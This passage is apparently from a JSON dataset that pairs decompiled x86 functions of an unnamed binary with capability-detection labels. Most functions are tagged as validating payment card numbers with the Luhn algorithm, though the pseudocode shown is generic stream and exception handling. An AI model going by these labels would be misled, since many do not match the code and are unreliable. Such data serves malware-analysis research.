        "decompiled_code": "\nvoid __fastcall fcn.0041a36c(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = fcn.0041aecc;\n    fcn.0041a314(&stack0xfffffffc);\n    (**(*param_2 + 4))(pcVar1);\n    return;\n}\n",
        "token_count": 93
    },
    "0041a3cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a3cc(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x41a461;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    iVar2 = (**(*param_2 + 0x14))();\n    if ((iVar1 == iVar2) && (-1 < iVar1 + -1)) {\n        uVar3 = true;\n        do {\n            (**(*in_EAX + 0xc))();\n            (**(*param_2 + 0xc))(0);\n            fcn.00405974();\n            if (!uVar3) break;\n            iVar1 = iVar1 + -1;\n            uVar3 = iVar1 == 0;\n        } while (!uVar3);\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a468;\n    uStack44 = 0x41a460;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 337
    },
    "0041a478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a478(uint param_1, uint param_2)\n\n{\n    uint uStack52;\n    int32_t iStack48;\n    uint uStack44;\n    uchar auStack16 [4];\n    uchar uStack12;\n    \n    fcn.0041a474();\n    uStack12 = 0;\n    uStack52 = 0;\n    iStack48 = fcn.0040db28(0, auStack16);\n    if (iStack48 == 0) {\n        iStack48 = fcn.00405470();\n    }\n    uStack44 = param_2;\n    // WARNING: Could not recover jumptable at 0x00404ee5. Too many branches\n    // WARNING: Treating indirect jump as call\n    (**0x493014)(0xeedfade, 1, 7, &uStack52);\n    return;\n}\n",
        "token_count": 196
    },
    "0041a508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041a508(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack36 = &stack0xfffffffc;\n    uStack40 = 0x41a5e3;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack48 = 0x41a536;\n    fcn.0041a2fc();\n    uStack52 = 0x41a5be;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack48 = &stack0xfffffffc;\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0xc))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x18))();\n    (**(*in_EAX + 0x24))();\n    (**(*in_EAX + 0x20))();\n    (**(*in_EAX + 0x24))();\n    *in_FS_OFFSET = uStack56;\n    puStack48 = 0x41a5c5;\n    uStack52 = 0x41a5bd;\n    fcn.0041a3b8();\n    return;\n}\n",
        "token_count": 364
    },
    "0041a78c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041a78c(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x41a804;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = (**(*in_EAX + 0x34))();\n            if (iVar2 == 0) break;\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41a80b;\n    uStack36 = 0x41a803;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 267
    },
    "0041a818": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a818(uint param_1, uint param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    var_18h = 0;\n    var_14h = 0;\n    var_4h = 0;\n    uStack44 = 0x41a8db;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    var_8h = param_2;\n    iVar1 = (**(*in_EAX + 0x14))();\n    if (-1 < iVar1 + -1) {\n        var_ch = 0;\n        var_10h = iVar1;\n        do {\n            (**(*in_EAX + 0xc))();\n            fcn.0041aff4();\n            fcn.00405718();\n            iVar1 = fcn.0040e8bc();\n            if (iVar1 != 0) {\n                fcn.00405a44(&fcn.0041a818::var_18h);\n                iVar1 = (**(*in_EAX + 0x34))();\n                if (iVar1 == 0) goto code_r0x0041a8b8;\n            }\n            var_ch = var_ch + 1;\n            var_10h = var_10h + -1;\n        } while (var_10h != 0);\n    }\n    var_ch = -1;\ncode_r0x0041a8b8:\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x41a8e2;\n    uStack44 = 0x41a8d2;\n    fcn.00405554();\n    uStack44 = 0x41a8da;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 479
    },
    "0041a9a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a9a4(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uchar *puStack36;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41aa41;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStack36 = 0x41a9cc;\n    fcn.0041a2fc();\n    uStack40 = 0x41aa24;\n    uStack44 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    puStack36 = &stack0xfffffffc;\n    (***param_2)();\n    fcn.0041b704();\n    fcn.00405620();\n    (**(*param_2 + 0xc))();\n    (**(*in_EAX + 0x2c))();\n    *in_FS_OFFSET = uStack44;\n    puStack36 = 0x41aa2b;\n    uStack40 = 0x41aa23;\n    fcn.0041a3b8();\n    return;\n}\n",
        "token_count": 311
    },
    "0041aa50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041aa50(int32_t param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41aaf1;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    if (param_1 != param_2) {\n        puStack40 = 0x41aa7f;\n        fcn.0041a2fc();\n        uStack44 = 0x41aad4;\n        uStack48 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd0;\n        puStack40 = &stack0xfffffffc;\n        (**(*in_EAX + 0xc))();\n        uVar1 = (**(*in_EAX + 0x18))();\n        (**(*in_EAX + 0x48))();\n        (**(*in_EAX + 100))();\n        *in_FS_OFFSET = uVar1;\n        uStack44 = 0x41aadb;\n        uStack48 = 0x41aad3;\n        fcn.0041a3b8();\n        return;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41aaf8;\n    uStack32 = 0x41aaf0;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 379
    },
    "0041ab34": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041ab34(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = 0;\n    uStack24 = 0x41abd8;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x41ab5b;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    fcn.0041dc70();\n    puStack32 = 0x41ab63;\n    fcn.0041a2fc();\n    uStack36 = 0x41abb3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    (**(*var_4h + 0x44))();\n    while( true ) {\n        cVar1 = fcn.0041cbbc();\n        if (cVar1 != '\\0') break;\n        fcn.0041e9a0();\n        (**(*var_4h + 0x38))();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x41abba;\n    uStack36 = 0x41abb2;\n    fcn.0041a3b8();\n    return;\n}\n",
        "token_count": 389
    },
    "0041b344": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041b344(void)\n\n{\n    int32_t *in_EAX;\n    \n    (**(*in_EAX + 0x28))();\n    return;\n}\n",
        "token_count": 39
    },
    "0041b418": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b418(uint arg_8h)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t in_EDX;\n    \n    (**(*in_EAX + 0x84))();\n    if (in_EAX[7] == in_EAX[8]) {\n        fcn.0041b344();\n    }\n    if (in_EDX < in_EAX[7]) {\n        fcn.004030fc();\n    }\n    puVar1 = in_EAX[6] + in_EDX * 8;\n    *puVar1 = 0;\n    puVar1[1] = arg_8h;\n    fcn.00405584();\n    in_EAX[7] = in_EAX[7] + 1;\n    (**(*in_EAX + 0x80))();\n    return;\n}\n",
        "token_count": 192
    },
    "0041b704": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041b704(void)\n\n{\n    ulong uVar1;\n    int32_t *in_EAX;\n    \n    uVar1 = (**(*in_EAX + 0x18))(0, 0);\n    return uVar1;\n}\n",
        "token_count": 56
    },
    "0041b7f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041b7f0(uint arg_8h)\n\n{\n    uint var_108h;\n    uint *var_8h;\n    uint var_4h;\n    \n    fcn.00404530();\n    var_8h = &var_108h;\n    var_4h._0_1_ = 4;\n    fcn.0040dbe4(0, &var_8h);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 117
    },
    "0041ba94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ba94(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStackY32;\n    uint uStackY28;\n    uchar *puStackY24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStackY24 = 0x41bab0;\n    fcn.0041c308(0x1000);\n    uStackY28 = 0x41bae4;\n    uStackY32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    puStackY24 = &stack0xfffffffc;\n    fcn.0041e550();\n    *in_FS_OFFSET = uStackY32;\n    puStackY24 = 0x41baeb;\n    uStackY28 = 0x41bae3;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 192
    },
    "0041baf4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041baf4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 164
    },
    "0041bbb8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041bbb8(uint32_t arg_8h)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    uVar1 = 0;\n    fcn.0041bbfc(0, arg_8h & 0xffff);\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar1;\n    }\n    return in_EAX;\n}\n",
        "token_count": 148
    },
    "0041bffc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041bffc(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    fcn.00405584();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 136
    },
    "0041c15c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c15c(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EAX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint noname_0;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    noname_0 = 0;\n    fcn.004059dc();\n    fcn.0041c254(noname_0, arg_8h);\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = noname_0;\n    }\n    return in_EAX;\n}\n",
        "token_count": 168
    },
    "0041c308": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c308(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 0xc) = arg_8h;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 208
    },
    "0041c454": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041c454(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 8) = arg_14h;\n    *(in_EAX + 0xc) = arg_10h;\n    fcn.00405584();\n    fcn.00405584();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 222
    },
    "0041c9f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041c9f4(void)\n\n{\n    uchar auStack12 [4];\n    uchar uStack8;\n    \n    uStack8 = 0xb;\n    fcn.0040dbe4(0, auStack12);\n    fcn.00404ec4();\n    return;\n}\n",
        "token_count": 66
    },
    "0041cf04": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041cf04(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int16_t *piVar3;\n    uint uVar4;\n    int32_t iStack20;\n    \n    iVar2 = fcn.00404528();\n    do {\n        if (iVar2 == *0x417510) {\n            if (*(in_EAX + 0x84) == 0) {\n                uVar4 = fcn.00418f94();\n            }\n            else {\n                uVar4 = fcn.00418e94();\n            }\n            return uVar4;\n        }\n        piVar3 = fcn.00418f1c();\n        if ((piVar3 != NULL) && (iVar2 = *piVar3,  -1 < iVar2 + -1)) {\n            iStack20 = 0;\n            do {\n                uVar4 = **(piVar3 + iStack20 * 2 + 1);\n                cVar1 = fcn.00404544();\n                if (cVar1 != '\\0') {\n                    return uVar4;\n                }\n                iStack20 = iStack20 + 1;\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        iVar2 = fcn.004045dc();\n    } while( true );\n}\n",
        "token_count": 301
    },
    "0041d130": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041d130(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x41d143;\n    (**(*param_2 + 0x20))();\n    uStack24 = 0x41d1d0;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0041cbbc();\n    if (cVar1 == '\\0') {\n        fcn.0041a0ac();\n    }\n    while( true ) {\n        cVar1 = fcn.0041cbbc();\n        if (cVar1 != '\\0') break;\n        cVar1 = fcn.0041cfb4();\n        if (cVar1 - 2U < 3) {\n            fcn.0041dbc0();\n        }\n        fcn.0041a08c();\n        fcn.0041dc70();\n        while( true ) {\n            cVar1 = fcn.0041cbbc();\n            if (cVar1 != '\\0') break;\n            fcn.0041dddc();\n        }\n        fcn.0041dc78();\n    }\n    fcn.0041dc78();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41d1d7;\n    uStack24 = 0x41d1cf;\n    (**(*param_2 + 0x24))();\n    return;\n}\n",
        "token_count": 380
    },
    "0041d8a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041d8a0(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    while( true ) {\n        puStack32 = 0x41d8c2;\n        cVar3 = fcn.0041cbbc();\n        if (cVar3 != '\\0') break;\n        puStack32 = 0x41d8ba;\n        fcn.0041dddc();\n    }\n    puStack32 = 0x41d8ce;\n    fcn.0041dc78();\n    uVar1 = *(in_EAX + 0x2c);\n    uVar2 = *(in_EAX + 0x28);\n    puStack32 = 0x41d8eb;\n    uVar4 = fcn.0040484c();\n    *(in_EAX + 0x2c) = uVar4;\n    uStack36 = 0x41d962;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    iVar5 = fcn.0040484c();\n    *(in_EAX + 0x28) = iVar5;\n    if (iVar5 == 0) {\n        *(in_EAX + 0x28) = *(in_EAX + 0x18);\n    }\n    while( true ) {\n        cVar3 = fcn.0041cbbc();\n        if (cVar3 != '\\0') break;\n        fcn.0041d5f0();\n    }\n    fcn.0041dc78();\n    *in_FS_OFFSET = uStack40;\n    *(in_EAX + 0x2c) = uVar1;\n    *(in_EAX + 0x28) = uVar2;\n    return;\n}\n",
        "token_count": 471
    },
    "0041d9a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d9a8(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041eb40();\n    if (cVar2 == '\\x15') {\n        fcn.0041cfd8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dc2c();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 139
    },
    "0041d9ec": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041d9ec(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    float fStack16;\n    \n    cVar2 = fcn.0041eb40();\n    if (cVar2 == '\\x0f') {\n        fcn.0041cfd8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dc2c();\n        fStack16 = iVar1;\n    }\n    return fStack16;\n}\n",
        "token_count": 139
    },
    "0041da30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041da30(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int64_t iStack20;\n    \n    cVar2 = fcn.0041eb40();\n    if (cVar2 == '\\x10') {\n        fcn.0041cfd8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dc2c();\n        iStack20 = ROUND(iVar1 * *0x41da7c);\n    }\n    return iStack20;\n}\n",
        "token_count": 149
    },
    "0041da80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 fcn.0041da80(void)\n\n{\n    int64_t iVar1;\n    char cVar2;\n    int32_t in_EAX;\n    double dStack20;\n    \n    cVar2 = fcn.0041eb40();\n    if (cVar2 == '\\x11') {\n        fcn.0041cfd8();\n    }\n    else {\n        *(in_EAX + 0x10) = *(in_EAX + 0x10) + -1;\n        iVar1 = fcn.0041dc2c();\n        dStack20 = iVar1;\n    }\n    return dStack20;\n}\n",
        "token_count": 137
    },
    "0041dbc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041dbc0(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    char cStack8;\n    uchar uStack7;\n    int16_t iStack6;\n    \n    cVar1 = fcn.0041eb40();\n    if (cVar1 == '\\x02') {\n        fcn.0041cfd8();\n        iStack12 = cStack8;\n    }\n    else if (cVar1 == '\\x03') {\n        fcn.0041cfd8();\n        iStack12 = iStack6;\n    }\n    else if (cVar1 == '\\x04') {\n        fcn.0041cfd8();\n    }\n    else {\n        fcn.0041c9e8();\n    }\n    return CONCAT26(iStack6, CONCAT15(uStack7, CONCAT14(cStack8, iStack12)));\n}\n",
        "token_count": 193
    },
    "0041dc2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0041dc2c(void)\n\n{\n    char cVar1;\n    int32_t iStack12;\n    int32_t iStack8;\n    \n    cVar1 = fcn.0041cfb4();\n    if (cVar1 == '\\x13') {\n        fcn.0041eb40();\n        fcn.0041cfd8();\n    }\n    else {\n        iStack12 = fcn.0041dbc0();\n        iStack8 = iStack12 >> 0x1f;\n    }\n    return CONCAT44(iStack8, iStack12);\n}\n",
        "token_count": 129
    },
    "0041e034": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e034(void)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = fcn.0041927c();\n    if ((pcVar2 != NULL) && (cVar1 = (*pcVar2)(),  cVar1 != '\\0')) {\n        fcn.00416678();\n        return;\n    }\n    fcn.0041c9e8();\n    return;\n}\n",
        "token_count": 111
    },
    "0041e4f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e4f0(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00405584();\n    while( true ) {\n        cVar1 = fcn.00419414();\n        if (cVar1 != '\\0') break;\n        fcn.0040af88(param_2);\n    }\n    return;\n}\n",
        "token_count": 113
    },
    "0041e9a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041e9a0(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x41ea4d;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    cVar1 = fcn.0041cfb4();\n    if ((cVar1 == '\\x12') || (cVar1 == '\\x14')) {\n        fcn.0041ea5c();\n        fcn.004057d4();\n    }\n    else {\n        cVar1 = fcn.0041eb40();\n        if (cVar1 == '\\x06') {\n            fcn.0041cfd8();\n        }\n        else if (cVar1 == '\\f') {\n            fcn.0041cfd8();\n        }\n        else {\n            fcn.0041c9e8();\n        }\n        fcn.00405c6c();\n        fcn.0041cfd8();\n    }\n    *in_FS_OFFSET = uStack32;\n    puStack24 = 0x41ea54;\n    uStack28 = 0x41ea4c;\n    fcn.00405d28();\n    return;\n}\n",
        "token_count": 315
    },
    "0041ea5c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041ea5c(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x41eb33;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    cVar1 = fcn.0041cfb4();\n    if ((cVar1 == '\\x06') || (cVar1 == '\\f')) {\n        fcn.0041e9a0();\n        fcn.00405ea8();\n    }\n    else {\n        cVar1 = fcn.0041eb40();\n        if (cVar1 == '\\x12') {\n            fcn.0041cfd8();\n            fcn.00405fa4();\n            fcn.0041cfd8();\n        }\n        else if (cVar1 == '\\x14') {\n            fcn.0041cfd8();\n            fcn.00405c6c();\n            fcn.0041cfd8();\n            fcn.00407448();\n        }\n        else {\n            fcn.0041c9e8();\n        }\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x41eb3a;\n    uStack32 = 0x41eb2a;\n    fcn.00405530();\n    